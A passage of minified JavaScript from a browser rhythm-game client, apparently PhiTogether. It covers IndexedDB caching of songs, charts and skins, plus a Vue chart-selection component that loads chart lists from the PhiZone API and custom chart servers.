getCachedSong(t).then(f=>f).catch(f=>s("Song Not Found"));if(!o)return s("Song Not Found");const{songFile:l,illustrationFile:d}=o,{chartFile:u}=r;if(!l||!d||!u)return s("Uncaught Error");n([l,d,u,r.assetsFile||null])}).catch(r=>s("Chart Not Found"))})}function getChartsFilesByMeta(e,t){return new Promise((n,s)=>{if(!t)if(e.song instanceof Object)t=e.song;else return s(null);getChartsFiles(parseCustomServerChartId(e.id)).then(r=>{if(r)return n(r)}).catch(r=>{r==="Song Not Found"?o():r==="Chart Not Found"?l():s(r);function o(){downloadSong(t).then(d=>saveCachedSong(d)).then(()=>getChartsFiles(parseCustomServerChartId(e.id))).then(async d=>{n(d),deleteInCacheIfCached(t.song),deleteInCacheIfCached(t.illustration)}).catch(d=>{d==="Chart Not Found"?l():s("Song Not Found")})}function l(){downloadChart(e).then(d=>saveCachedChart(d)).then(()=>getChartsFiles(parseCustomServerChartId(e.id))).then(d=>{n(d),deleteInCacheIfCached(e.chart)}).catch(d=>{d==="Song Not Found"?o():s("Chart Not Found")})}})})}function blobs2responses(e){const t=[];for(const n of e)t.push(new Response(n));return t}function cachedChart2Meta(e){return{id:e.id,level:e.level,difficulty:e.difficulty,chart:`/PTVirtual/db/chart/${e.id}`,charter:e.charter,song:e.song,assetsNum:e.assetsFile?e.assetsFile.length:0,isFromPhiZone:e.from===2,isFromURL:e.from===0,origin:e.origin}}function cachedSong2Meta(e){return{id:e.id,name:e.name,composer:e.composer,illustrator:e.illustrator,song:`/PTVirtual/db/song/${e.id}`,illustration:`/PTVirtual/db/illustration/${e.id}`,charts:e.charts,isFromPhiZone:e.from===2,isFromURL:e.from===0,origin:e.origin}}function getAllCharts(e=ObjectStores.Chart){return new Promise((t,n)=>{openDB().then(s=>{const r=s.transaction([e]).objectStore(e);r.getAll().onsuccess=o=>{t(o.target.result)}}).catch(s=>n(s))})}function getAllSongs(e=ObjectStores.Song){return new Promise((t,n)=>{openDB().then(s=>{const r=s.transaction([e]).objectStore(e);r.getAll().onsuccess=o=>{t(o.target.result)}}).catch(s=>n(s))})}function getAllChartsKeys(e=ObjectStores.Chart){return new Promise((t,n)=>{openDB().then(s=>{const r=s.transaction([e]).objectStore(e);r.getAllKeys().onsuccess=o=>{t(o.target.result)}}).catch(s=>n(s))})}async function renderPZApi(){const e={total:null,perPage:null,hasPrevious:null,hasNext:null,results:[]},t=await renderPZApiFromCache();if(!window.indexedDB)return e.results=t,e;const n=await getAllCharts(),s={};for(const r of n)if(!(!r||!r.song)){if(!s[r.song]){const o=await getCachedSong(r.song).catch(l=>null);if(!o)continue;s[r.song]=o,s[r.song].charts=[]}s[r.song].charts.push(cachedChart2Meta(r))}for(const r in s)e.results.push(cachedSong2Meta(s[r]));for(const r in t)e.results.push(t[r]);return e.total=e.results.length,e}async function renderCacheList(){const e=[],t=await getAllCharts(),n=await getAllSongs(),s={};for(const r of t)if(r){if(!s[r.song]){const o=await getCachedSong(r.song).catch(l=>null);o?(s[r.song]=o,s[r.song].charts=[]):s[r.song]={charts:[]}}s[r.song].charts.push(cachedChart2Meta(r))}for(const r of n)r&&(s[r.id]||(r.charts=[],s[r.id]=r));for(const r in s)e.push(cachedSong2Meta(s[r]));return e}async function getSongFile(e,t){return await getCachedSong(e.id).then(s=>new Response(s.songFile)).catch(s=>null)||fetch(e.song,t)}async function fetch$2(e,t){var n,s;if(e.startsWith("/PTVirtual/db/")){const r=e.slice(14).split("/");if(!r[1])return await window.fetch(e);if(r[0]==="chart"||r[0]==="assets"){const o=await((n=getCachedChart(r[1]))==null?void 0:n.then(l=>l).catch(async l=>t?(await downloadChart(t).then(saveCachedChart),await getCachedChart(r[1])):null));return o?r[0]==="assets"?new Response(o.assetsFile):new Response(o.chartFile):await window.fetch(e)}else if(r[0]==="song"||r[0]==="illustration"){const o=await((s=getCachedSong(r[1]))==null?void 0:s.then(l=>l).catch(async l=>t?(await downloadSong(t).then(saveCachedSong),await getCachedSong(r[1])):null));return o?r[0]==="song"?new Response(o.songFile):new Response(o.illustrationFile):await window.fetch(e)}else return await window.fetch(e)}else return await window.fetch(e)}function generateUUID(){var e=Date.now();return typeof performance<"u"&&typeof performance.now=="function"&&(e+=performance.now()),"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(t){var n=(e+Math.random()*16)%16|0;return e=Math.floor(e/16),(t==="x"?n:n&3|8).toString(16)})}function saveSkin(e,t,n){return new Promise(async(s,r)=>{if(await haveCommonSkin(t)&&await shared$1.game.msgHandler.confirm(shared$1.game.i18n.t("skin.haveCommon")))return s();const o=new Map;e.has("Tap")&&(o.set("Tap",{type:"Tap",file:await createImageBitmap(new Blob([e.get("Tap").buffer]))}),e.has("TapHL")&&o.set("TapHL",{type:"TapHL",file:await createImageBitmap(new Blob([e.get("TapHL").buffer]))})),e.has("Drag")&&(o.set("Drag",{type:"Drag",file:await createImageBitmap(new Blob([e.get("Drag").buffer]))}),e.has("DragHL")&&o.set("DragHL",{type:"DragHL",file:await createImageBitmap(new Blob([e.get("DragHL").buffer]))})),e.has("Flick")&&(o.set("Flick",{type:"Flick",file:await createImageBitmap(new Blob([e.get("Flick").buffer]))}),e.has("FlickHL")&&o.set("FlickHL",{type:"FlickHL",file:await createImageBitmap(new Blob([e.get("FlickHL").buffer]))})),e.has("Hold")&&(o.set("Hold",{type:"Hold",file:await createImageBitmap(new Blob([e.get("Hold").buffer]))}),e.has("HoldHL")&&o.set("HoldHL",{type:"HoldHL",file:await createImageBitmap(new Blob([e.get("HoldHL").buffer]))}),e.has("HitFX")&&o.set("HitFX",{type:"HitFX",file:await createImageBitmap(new Blob([e.get("HitFX").buffer]))}),e.has("HitSong0")&&o.set("HitSong0",{type:"HitSong0",file:e.get("HitSong0").buffer.slice(0)}),e.has("HitSong1")&&o.set("HitSong1",{type:"HitSong1",file:e.get("HitSong0").buffer.slice(0)}),e.has("HitSong2")&&o.set("HitSong0",{type:"HitSong0",file:e.get("HitSong2").buffer.slice(0)}),openDB().then(l=>{const d=generateUUID();l.transaction([ObjectStores.Skin],"readwrite").objectStore(ObjectStores.Skin).add({id:d,name:t.name||"unknown",author:t.author||"unknown",files:o,config:n}),s(d)}).catch(l=>r(l)))})}function getAllSkins(e=ObjectStores.Skin){return new Promise((t,n)=>{openDB().then(s=>{const r=s.transaction([e]).objectStore(e);r.getAll().onsuccess=o=>{t(o.target.result)}}).catch(s=>n(s))})}function haveCommonSkin(e){return new Promise(async t=>{const n=await getAllSkins(ObjectStores.Skin);for(const s of n)if(s.name===e.name&&s.author===e.author)return t(!0);t(!1)})}function getSkin(e){return new Promise((t,n)=>{openDB().then(s=>{const o=s.transaction([ObjectStores.Skin]).objectStore(ObjectStores.Skin).get(e);o.onsuccess=l=>{const d=o.result;d?t(d):n(l)},o.onerror=l=>n(l)}).catch(s=>n(s))})}const gameConfig={get:getGameConfig,save:saveGameConfig},fetch$1=fetch$2,chart={chart:{download:downloadChart,save:saveCachedChart,get:getCachedChart,delete:deleteCachedChart},song:{download:downloadSong,save:saveCachedSong,get:getCachedSong,delete:deleteCachedSong,fetch:getSongFile,has:haveSong},illustration:{getAsB64:getSongsIllustrationAsB64},getChartsFiles:{id:getChartsFiles,meta:getChartsFilesByMeta},renderApi:renderPZApi,renderCacheList,blobs2responses,checkLocalChart},skin={save:saveSkin,getAll:getAllSkins,get:getSkin},ptdb={gameConfig,fetch:fetch$1,chart,skin};function getUserColor(e){switch(e){case"Member":return"rgb(115 115 115)";case"Sponsor":return"rgb(245 158 11)";case"Qualified":return"rgb(20 184 166)";case"Volunteer":return"rgb(249 115 22)";case"Moderator":return"rgb(16 185 129)";case"Administrator":return"rgb(99 102 241)";default:return"rgb(120 113 108)"}}const chartselect_vue_vue_type_style_index_0_lang="",_export_sfc=(e,t)=>{const n=e.__vccOpts||e;for(const[s,r]of t)n[s]=r;return n},_sfc_main$f={name:"chartSelect",data(){return{search:{name:"",composer:"",illustrator:""},chartList:{},chapterList:[],beforeSearch:[],beforePagination:[],page:1,toPage:null,showMoreSearchQueryInput:!1,selectChoice:"local",selectChapter:"",forceOffline:!1,selectedSongData:null,selectedPlayingSettings:{speed:"",mirror:!1,practiseMode:!1,previewMode:!1,adjustOffset:!1,videoRecorder:!1},ct:{},toSyncOrPlay:0,scrolledTop:0,configDialogOpened:!1,chartSelectorOpenedTab:"chartSelect",canEdit:!1,favouriteSongs:[]}},computed:{canPrev(){if(["pz","favorite"].includes(this.selectChoice))return this.chartList.hasPrevious;if(["local","custom"].includes(this.selectChoice))return this.page-1>0},canNext(){if(["pz","favorite"].includes(this.selectChoice))return this.chartList.hasNext;if(["local","custom"].includes(this.selectChoice))return this.page+1<=this.pageAll},pzResUrlGlobal(){"res.phizone.cn"},customChartServer(){return shared$1.game.ptmain.gameConfig.customChartServer},pageAll(){try{if(["pz","favorite"].includes(this.selectChoice)){const e=this.chartList.total;return e?Math.ceil(e/32):1}else if(["local","custom"].includes(this.selectChoice)){const e=this.beforePagination.length;return e?Math.ceil(e/32):1}}catch{return 1}},isSingle(){return shared$1.game.ptmain.gameMode==="single"},canFav(){return this.selectedSongData&&this.selectedSongData.isFromPhiZone},isMulti(){return shared$1.game.ptmain.gameMode==="multi"},uiBlurPreference(){return!shared$1.game.ptmain.gameConfig.noUIBlur}},async mounted(){this.$route.query.offline==1&&(this.forceOffline=!0),this.loadOffline()},activated(){if(audio.stop(),stage.style.display="none",this.$route.query.toSyncOrPlay&&this.$route.query.toSyncOrPlay==3){this.selectChoice="empty";const e=JSON.parse(sessionStorage.getItem("loadedChart"));this.ct=e,this.toSyncOrPlay=3;return}this.selectChoice==="empty"&&(this.selectedSongData=null,this.selectChoice="local",this.loadOffline()),this.selectedSongData&&this.playPreview(this.selectedSongData),this.toSyncOrPlay=0,this.ct=null,!navigator.onLine&&!this.forceOffline&&this.selectChoice!=="local"&&(this.forceOffline=!0,this.loadOffline()),["local"].includes(this.selectChoice)&&this.loadOffline(),document.querySelector("#songSelectList").scrollTop=this.scrolledTop,ptdb.gameConfig.get("favouriteSongs",[]).then(e=>this.favouriteSongs=e).catch(e=>e)},deactivated(){audio.stop(),shared$1.game.loadHandler.r(),shared$1.game.loadHandler.r("loadChart")},beforeRouteLeave(e,t,n){this.scrolledTop=document.querySelector("#songSelectList")?document.querySelector("#songSelectList").scrollTop:0,n()},methods:{back2song(){this.selectedSongData=null,audio.stop()},async goJustPageAsk(){const e=await shared$1.game.msgHandler.prompt(this.$t("chartSelect.jumpto",[this.pageAll]));e&&this.goJustPage(e)},goJustPage(e){if(!(e>=1&&e<=this.pageAll)){shared$1.game.msgHandler.sendMessage(this.$t("chartSelect.inputDosentMatchRequirement"),"error");return}["pz","favorite"].includes(this.selectChoice)?this.loadPagePZv2(e):["local","custom"].includes(this.selectChoice)&&(this.page=e,this.updatePagination())},loadPrevPage(){["pz","favorite"].includes(this.selectChoice)?this.loadPagePZv2(this.page-1):["local","custom"].includes(this.selectChoice)&&(this.page=this.page-1,this.updatePagination())},loadNextPage(){["pz","favorite"].includes(this.selectChoice)?this.loadPagePZv2(this.page+1):["local","custom"].includes(this.selectChoice)&&(this.page=this.page+1,this.updatePagination())},updatePagination(){this.page<1&&(this.page=1),this.page>this.pageAll&&(this.page=this.pageAll),this.chartList={results:this.beforePagination?this.beforePagination.slice(32*this.page-32,32*this.page):[]}},async loadOffline(){this.forceOffline&&this.selectChoice!=="custom"&&(this.selectChoice="local");let{results:e}=await ptdb.chart.renderApi(),t=[];for(const n of e)n.song&&n.illustration&&n.charts&&t.push(n);this.beforeSearch=t,this.beforePagination=this.beforeSearch,this.updatePagination()},async goDetails(e){this.selectedSongData!==e&&((!e.charts||!e.charts.length)&&(e.charts=await PhiZoneAPI.getSongsChartsAsv1(e.id)),sessionStorage.setItem("chartDetailsData",JSON.stringify(e)),ptdb.chart.song.has(e.id).then(t=>this.canEdit=t),this.selectedSongData=e,this.selectChart(e.charts[0]),audio.stop(),this.playPreview(e))},async playPreview(e){this.previewAbortController=new AbortController,ptdb.chart.song.fetch(e,{signal:this.previewAbortController.signal}).then(async t=>{audio.stop();const n=await t.arrayBuffer(),s=await audio.decode(n);this.selectedSongData.id!==e.id||this.$route.path!=="/chartSelect"||(audio.play(s,{loop:!0,offset:this.toSecond(e.preview_start||0),singleAudioAllowed:!0}),this.previewAbortController=null)}).catch(t=>{this.previewAbortController&&shared$1.game.msgHandler.sendMessage(this.$t("chartSelect.previewLoadFailed"),"error")})},doSearch(){this.selectChoice==="pz"?this.loadPagePZv2(1,!0,this.search.name):["local","custom"].includes(this.selectChoice)?(this.beforePagination=this.beforeSearch.filter(e=>e.name.toLowerCase().includes(this.search.name.toLowerCase())&&e.composer.toLowerCase().includes(this.search.composer.toLowerCase())&&e.illustrator.toLowerCase().includes(this.search.illustrator.toLowerCase())),this.page=1,this.updatePagination()):["custom","favorite"].includes(this.selectChoice)&&(this.chartList.resultsbak||(this.chartList.resultsbak=this.chartList.results),this.chartList.results=this.chartList.resultsbak.filter(e=>e.name.toLowerCase().includes(this.search.name.toLowerCase())))},async loadPage(e,t=!1){shared$1.game.loadHandler.l(this.$t("chartSelect.loadingChartList")),t&&(this.page=1);try{let n=new Headers;n.append("User-Agent","PhiZoneRegularAccess");const s=await(await fetch(e.replace(/https?:\/\/api.phi.zone/,"https://api.phi.zone"),{headers:n})).json();this.chartList.previous&&e==this.chartList.previous&&this.page--,this.chartList.next&&e==this.chartList.next&&this.page++,this.toPage&&(this.page=this.toPage,this.toPage=null),s.results.reverse(),this.beforeSearch=s.results,this.beforePagination=this.beforeSearch,this.updatePagination(),document.querySelector("#app").scrollTop=0,shared$1.game.loadHandler.r()}catch{shared$1.game.msgHandler.sendMessage(this.$t("chartSelect.loadFailed"),"error"),shared$1.game.loadHandler.r();return}},async loadPagePZv2(e,t=!1,n){shared$1.game.loadHandler.l(this.$t("chartSelect.loadingChartList")),t&&(this.page=e=1);try{const s=await PhiZoneAPI.getAllSongsAndChartsAsv1(e,n);this.page=e,this.chartList=s,document.querySelector("#app").scrollTop=0,shared$1.game.loadHandler.r()}catch{shared$1.game.msgHandler.sendMessage(this.$t("chartSelect.loadFailed"),"error"),shared$1.game.loadHandler.r();return}},async loadChapters(e){shared$1.game.loadHandler.l(this.$t("chartSelect.loadingChapterList"));try{const t=await(await fetch(e.replace(/https?:\/\/api.phi.zone/,"https://proxy.phitogether.fun/phizoneApi"))).json();this.chapterList=t,document.querySelector("#app").scrollTop=0,this.selectChapter=0,this.loadPage(this.chapterList[0].songsListUrls[0],!0),shared$1.game.loadHandler.r()}catch{shared$1.game.msgHandler.sendMessage(this.$t("chartSelect.loadFailed"),"error"),shared$1.game.loadHandler.r();return}},imgCompLink(e){return e},toggleInput(){this.showMoreSearchQueryInput=!this.showMoreSearchQueryInput},generateFavoriteList(){let e=localStorage.getItem("favourites");if(e){let t="";e=JSON.parse(e);for(let n of e)t=`${t}${e.indexOf(n)===0?"":","}${n}`;return t}else return""},async loadFavouriteSongs(){shared$1.game.loadHandler.l(this.$t("chartSelect.loadingChartList")),this.page=1;const e={total:0,perPage:114514,hasPrevious:!1,hasNext:!1,results:[]};e.results=await ptdb.chart.renderApi().then(t=>t.results).then(t=>t.filter(n=>this.favouriteSongs.includes(n.id))),this.chartList=e,document.querySelector("#app").scrollTop=0,shared$1.game.loadHandler.r()},toRank(e){this.previewAbortController&&(this.previewAbortController.abort(),this.previewAbortController=null),audio.stop(),sessionStorage.setItem("loadedChart",JSON.stringify(e)),this.$router.push({path:"/pzRankSingle",query:{id:e.id}})},getDifficultyActual(e){return typeof e.difficulty=="string"||!e.difficulty?e.difficulty:e.difficulty===0?"?":Math.floor(e.difficulty)},toSecond(e){try{const t=e.split(":");return t[0]*3600+t[1]*60+t[2]*1}catch{return 0}},cleanStr(e){return e.replace(new RegExp([...e.matchAll(new RegExp("\\[PZ([A-Za-z]+):([0-9]+):((?:(?!:PZRT]).)*):PZRT\\]","g"))].length===0?"\\[PZ([A-Za-z]+):([0-9]+):([^\\]]+)\\]":"\\[PZ([A-Za-z]+):([0-9]+):((?:(?!:PZRT]).)*):PZRT\\]","gi"),"$3")},getLevelColor(e){return e=e.toUpperCase(),e==="IN"?"#d31314":e==="AT"?"#443":e==="HD"?"#2bf":e==="EZ"?"#5d0":"#00dddd"},selectChart(e){for(const t of this.selectedSongData.charts)t.selected=!1;if(!e.userScore){shared$1.game.ptmain.gameConfig.ptBestRecords||(shared$1.game.ptmain.gameConfig.ptBestRecords={});const t=(e.isFromPhiZone?shared$1.game.ptmain.gameConfig.account.pzBestRecords:shared$1.game.ptmain.gameConfig.ptBestRecords)[e.id]||[0,0,!1,!0];if(t[3])e.userScore=[["NEW","gray","15px",.6],"0000000","0.00%"];else{const n=t[0];e.userScore=[n===1e6?["φ","goldenrod","50px",-1]:t[2]?["V","deepskyblue","50px",-1]:n>=96e4?["V","gray","50px",-1]:n>=92e4?["S","gray","50px",-1]:n>=88e4?["A","gray","50px",-1]:n>=82e4?["B","gray","50px",-1]:n>=7e5?["C","gray","50px",-1]:["F","gray","50px",-1],this.scoreStr(t[0]),`${(t[1]*100).toFixed(2)}%`]}}e.selected=!0},async loadChart(e){const t={"c9e42da0-2149-4037-98be-e50070be9ad6":{type:"pgm",link:"/src/core/charts/pgm/c22in.json"}};if(e.id&&e.id in t){const n=t[e.id];switch(e.chart=n.link,n.type){case"pgm":await shared$1.game.msgHandler.info(this.$t("chartSelect.pgmChartNote"));break}}if(!e.chart){shared$1.game.msgHandler.failure(this.$t("chartSelect.unableToSelectDueToCopyrightReasons"));return}if(this.previewAbortController&&(this.previewAbortController.abort(),this.previewAbortController=null),this.ct=e,shared$1.game.ptmain.gameMode==="multi")if(shared$1.game.multiInstance.owner&&shared$1.game.multiInstance.room.stage===1){audio.stop(),this.toSyncOrPlay=2,this.multiSyncChart();return}else return;shared$1.game.ptmain.gameMode!=="multi"?(shared$1.game.ptmain.playConfig=JSON.parse(JSON.stringify(this.selectedPlayingSettings)),this.selectedPlayingSettings.previewMode||this.selectedPlayingSettings.adjustOffset?(shared$1.game.ptmain.playConfig.practiseMode=!0,shared$1.game.ptmain.playConfig.mode="preview"):shared$1.game.ptmain.playConfig.mode="play"):shared$1.game.ptmain.playConfig={},shared$1.game.loadHandler.l(this.$t("chartSelect.loadingChart"),"loadChart"),shared$1.game.ptmain.loadChart(this.selectedSongData,e,this.chartLoaded)},chartLoaded(e,t){this.$route.path==="/chartSelect"&&shared$1.game.ptmain.gameMode!=="multi"&&(this.toSyncOrPlay=1,shared$1.game.loadHandler.r("loadChart"),audio.stop(),this.playChart())},async playChart(){shared$1.game.ptmain.playChart()},edit(){this.$router.push({path:"/chartEdit"})},async deleteChart(){if(await shared$1.game.msgHandler.confirm(this.$t("cacheManage.confirmBeforeDelete"))){ptdb.chart.song.delete(this.selectedSongData.id);for(const e of this.selectedSongData.charts)ptdb.chart.chart.delete(e.id);this.selectedSongData=null,audio.stop(),this.loadOffline()}},scoreStr(e){const t=Math.round(e);return"0".repeat(t.length<7?7-t.length:0)+t},async favourite(){this.favouriteSongs.includes(this.selectedSongData.id)?(this.favouriteSongs=this.favouriteSongs.filter(e=>e!==this.selectedSongData.id),shared$1.game.msgHandler.sendMessage(this.$t("chartSelect.favourites.removedSuccessfully",[this.selectedSongData.name]))):(this.favouriteSongs.push(this.selectedSongData.id),shared$1.game.msgHandler.sendMessage(this.$t("chartSelect.favourites.addedSuccessfully",[this.selectedSongData.name])))},async multiSyncChart(){try{shared$1.game.loadHandler.l(this.$t("chartSelect.multiSyncChart.sync"),"syncChart"),await shared$1.game.multiInstance.syncChart(this.selectedSongData,this.ct,this.selectedPlayingSettings.speed),this.toSyncOrPlay=3}catch{shared$1.game.loadHandler.r("syncChart"),shared$1.game.msgHandler.sendMessage(this.$t("chartSelect.multiSyncChart.failed"),"error")}}},watch:{selectChoice:{handler(e,t){t==="empty"&&(this.selectChoice=t),e==="pz"?this.loadPagePZv2(1,!0):e==="local"?this.loadOffline():e==="favorite"?this.loadFavouriteSongs():e==="custom"?this.loadChapters(`https://${this.customChartServer}/chapters.json`):e==="empty"&&(this.chartList=[]),this.selectedSongData=null,audio.stop()}},selectChapter:{handler(e,t){this.loadPage(this.chapterList[e].songsListUrls[0],!0),this.selectedSongData=null,audio.stop()}},favouriteSongs:{handler(e){ptdb.gameConfig.save(e,"favouriteSongs")},deep:!0}},meta:{keepAlive:!0}},_hoisted_1$f={key:0,id:"songSelect",style:{width:"95%",margin:"0 auto"}},_hoisted_2$e={class:"songsSourceSelectContainer"},_hoisted_3$e={class:"songsSourceSelect"},_hoisted_4$d=["innerHTML"],_hoisted_5$d={key:0},_hoisted_6$d=createBaseVNode("br",null,null,-1),_hoisted_7$c=["innerHTML"],_hoisted_8$c={key:1},_hoisted_9$b=createBaseVNode("br",null,null,-1),_hoisted_10$a=["innerHTML"],_hoisted_11$a={key:2},_hoisted_12$9=createBaseVNode("br",null,null,-1),_hoisted_13$9=["innerHTML"],_hoisted_14$8=["value"],_hoisted_15$7={id:"songSelector",style:{width:"100%","overflow-y":"scroll","margin-top":"2.5vh",height:"calc(100% - 2.5vh)"}},_hoisted_16$7=["placeholder"],_hoisted_17$7=["value"],_hoisted_18$7=createBaseVNode("br",null,null,-1),_hoisted_19$6={id:"songSelectList",style:{"margin-top":"40px",overflow:"scroll",height:"calc((100% - 105px) - -2.0vh)"}},_hoisted_20$5={key:0},_hoisted_21$5={key:1,id:"chartListall"},_hoisted_22$5=["onClick"],_hoisted_23$5={style:{flex:"3",overflow:"hidden","aspect-ratio":"3 / 2"}},_hoisted_24$5=["src"],_hoisted_25$5={style:{flex:7,display:"flex",flexDirection:"column",lineHeight:"1.2em","margin-left":"1vw","margin-top":"1vh"}},_hoisted_26$5={style:{flex:"1","font-size":".6em"}},_hoisted_27$5={style:{flex:"3",display:"flex","flex-wrap":"wrap","align-items":"center"}},_hoisted_28$5={key:2,id:"chartListAll",style:{width:"100%"}},_hoisted_29$5=["onClick"],_hoisted_30$5=["src"],_hoisted_31$4={class:"songCardName"},_hoisted_32$4=createBaseVNode("br",null,null,-1),_hoisted_33$5={class:"songCardComposer"},_hoisted_34$5={key:0,style:{"margin-top":"2.5vh","overflow-y":"scroll",height:"calc(100% - 2.5vh)"}},_hoisted_35$4={class:"scoreSongCard",style:{width:"90%",height:"30vh"}},_hoisted_36$3=["src"],_hoisted_37$3={style:{display:"flex","justify-content":"space-evenly","flex-wrap":"wrap",height:"max-content"}},_hoisted_38$3={key:0,id:"chartSelectCharts"},_hoisted_39$3={key:0},_hoisted_40$3=["onClick"],_hoisted_41$3={style:{display:"flex",width:"100%","flex-direction":"column"}},_hoisted_42$3={style:{display:"flex",flex:"3","padding-top":"5px"}},_hoisted_43$3={class:"chartItemLevel",style:{"margin-left":"2%"}},_hoisted_44$3={class:"chartItemCharter",style:{"margin-left":"5%"}},_hoisted_45$3={key:0,class:"chartSelectChartItemDetalis",style:{display:"flex","text-align":"left","margin-left":"2%",flex:"7"}},_hoisted_46$3={style:{flex:"75","margin-top":"5px"}},_hoisted_47$3={style:{"margin-left":"5%","font-size":"25px"}},_hoisted_48$3={style:{"margin-left":"2%","font-size":"15px"}},_hoisted_49$3={class:"play",style:{display:"block",flex:"10"}},_hoisted_50$3=["onClick","value"],_hoisted_51$3=["onClick","value"],_hoisted_52$3={key:1,style:{"text-align":"center","padding-top":"20px"}},_hoisted_53$3={key:1,id:"chartSelectConfig"},_hoisted_54$2={key:0,style:{display:"flex"}},_hoisted_55$2={for:"selectMirror"},_hoisted_56$2={key:1,style:{display:"flex"}},_hoisted_57$2={for:"adjustOffset"},_hoisted_58$2={key:2,style:{display:"flex"}},_hoisted_59$2={key:0,for:"previewMode"},_hoisted_60$2={key:3,style:{display:"flex"}},_hoisted_61$2={key:1,for:"practiseMode"},_hoisted_62$2={style:{display:"flex"}},_hoisted_63$1={for:"videoRecorder"},_hoisted_64$1={style:{display:"flex"}},_hoisted_65$1={value:"Slowest"},_hoisted_66$1={value:"Slower"},_hoisted_67$1={value:"",selected:""},_hoisted_68$1={value:"Faster"},_hoisted_69$1={value:"Fastest"},_hoisted_70$1={key:1,id:"songSelect",style:{width:"95%",margin:"0 auto",display:"flex","align-items":"center","justify-content":"center"}},_hoisted_71$1={id:"waitMsg",style:{"font-size":"2em"}};function _sfc_render$f(e,t,n,s,r,o){return r.toSyncOrPlay!==3?(openBlock(),createElementBlock("div",_hoisted_1$f,[createBaseVNode("div",_hoisted_2$e,[createBaseVNode("div",_hoisted_3$e,[createBaseVNode("div",null,[withDirectives(createBaseVNode("input",{type:"radio",id:"sc1",name:"selectChoice","onUpdate:modelValue":t[0]||(t[0]=l=>r.selectChoice=l),value:"local"},null,512),[[vModelRadio,r.selectChoice]]),createBaseVNode("label",{for:"sc1",innerHTML:e.$t("chartSelect.songSource.local")},null,8,_hoisted_4$d)]),this.forceOffline?createCommentVNode("",!0):(openBlock(),createElementBlock("div",_hoisted_5$d,[_hoisted_6$d,withDirectives(createBaseVNode("input",{type:"radio",id:"sc2",name:"selectChoice","onUpdate:modelValue":t[1]||(t[1]=l=>r.selectChoice=l),value:"favorite"},null,512),[[vModelRadio,r.selectChoice]]),createBaseVNode("label",{for:"sc2",innerHTML:e.$t("chartSelect.songSource.favourites")},null,8,_hoisted_7$c)])),this.forceOffline?createCommentVNode("",!0):(openBlock(),createElementBlock("div",_hoisted_8$c,[_hoisted_9$b,withDirectives(createBaseVNode("input",{type:"radio",id:"sc0",name:"selectChoice","onUpdate:modelValue":t[2]||(t[2]=l=>r.selectChoice=l),value:"pz"},null,512),[[vModelRadio,r.selectChoice]]),createBaseVNode("label",{for:"sc0",innerHTML:e.$t("chartSelect.songSource.pz")},null,8,_hoisted_10$a)])),this.forceOffline?createCommentVNode("",!0):(openBlock(),createElementBlock("div",_hoisted_11$a,[_hoisted_12$9,withDirectives(createBaseVNode("input",{type:"radio",id:"sc3",name:"selectChoice","onUpdate:modelValue":t[3]||(t[3]=l=>r.selectChoice=l),value:"custom"},null,512),[[vModelRadio,r.selectChoice]]),r.selectChoice!="custom"||r.chapterList.length==1?(openBlock(),createElementBlock("label",{key:0,for:"sc3",innerHTML:e.$t("chartSelect.songSource.pt")},null,8,_hoisted_13$9)):withDirectives((openBlock(),createElementBlock("select",{key:1,id:"sc3.5","onUpdate:modelValue":t[4]||(t[4]=l=>r.selectChapter=l),style:{height:"5.5vh",width:"9vw",background:"#fff","margin-top":"-1vh"}},[(openBlock(!0),createElementBlock(Fragment,null,renderList(r.chapterList,l=>(openBlock(),createElementBlock("option",{value:r.chapterList.indexOf(l)},toDisplayString$1(l.name["zh-cn"]),9,_hoisted_14$8))),256))],512)),[[vModelSelect,r.selectChapter]])]))])]),createBaseVNode("div",{id:"songAndChartSelector",class:normalizeClass({blur:o.uiBlurPreference}),style:normalizeStyle({width:r.selectedSongData?"97.5vw":"90vw","border-radius":"12px",overflow:"hidden"})},[createBaseVNode("div",_hoisted_15$7,[createBaseVNode("div",{style:normalizeStyle([{width:r.selectedSongData?"41.2vw":"82vw"},{display:"flex",height:"35px",position:"fixed","z-index":"114"}])},[r.selectedSongData?(openBlock(),createElementBlock("a",{key:0,onClick:t[5]||(t[5]=(...l)=>o.back2song&&o.back2song(...l)),style:{"margin-top":".75%","margin-right":".75%"}},"⬅️")):createCommentVNode("",!0),withDirectives(createBaseVNode("input",{class:"input textInput","onUpdate:modelValue":t[6]||(t[6]=l=>r.search.name=l),id:"searchInput",placeholder:e.$t("chartSelect.search"),style:{flex:"15"},onKeyup:t[7]||(t[7]=withKeys((...l)=>o.doSearch&&o.doSearch(...l),["enter"])),autocomplete:"off"},null,40,_hoisted_16$7),[[vModelText,r.search.name]]),r.selectChoice==="local"?(openBlock(),createElementBlock("input",{key:1,type:"button",value:e.$t("chartSelect.import"),onClick:t[8]||(t[8]=l=>e.$router.push("/chartUpload")),style:{flex:"1","margin-left":"10px"}},null,8,_hoisted_17$7)):createCommentVNode("",!0),_hoisted_18$7],4),createBaseVNode("div",_hoisted_19$6,[!r.chartList.results||r.chartList.results.length==0?(openBlock(),createElementBlock("div",_hoisted_20$5,toDisplayString$1(e.$t("chartSelect.chartListIsEmpty")),1)):createCommentVNode("",!0),r.selectedSongData?(openBlock(),createElementBlock("div",_hoisted_21$5,[(openBlock(!0),createElementBlock(Fragment,null,renderList(r.chartList.results,l=>(openBlock(),createElementBlock("div",{class:"scoreSongCard songItem",style:normalizeStyle([{color:"black"},{display:"flex",background:r.selectedSongData==l?"rgba(255,255,255,0.75)":"rgba(237,247,255,0.4)",margin:"auto"}]),onClick:d=>o.goDetails(l)},[createBaseVNode("div",_hoisted_23$5,[createBaseVNode("img",{src:o.imgCompLink(l.illustration.replace("res.phi.zone",r.selectChoice==="custom"?o.customChartServer:o.pzResUrlGlobal)),style:{"object-fit":"cover",height:"100%",width:"100%"}},null,8,_hoisted_24$5)]),createBaseVNode("div",_hoisted_25$5,[createBaseVNode("div",null,toDisplayString$1(l.name),1),createBaseVNode("div",_hoisted_26$5,toDisplayString$1(l.composer),1),createBaseVNode("div",_hoisted_27$5,[(openBlock(!0),createElementBlock(Fragment,null,renderList(l.charts,d=>(openBlock(),createElementBlock("div",{class:"chartLevel",style:normalizeStyle({background:o.getLevelColor(d.level)})},[createBaseVNode("span",null,toDisplayString$1(d.level)+" 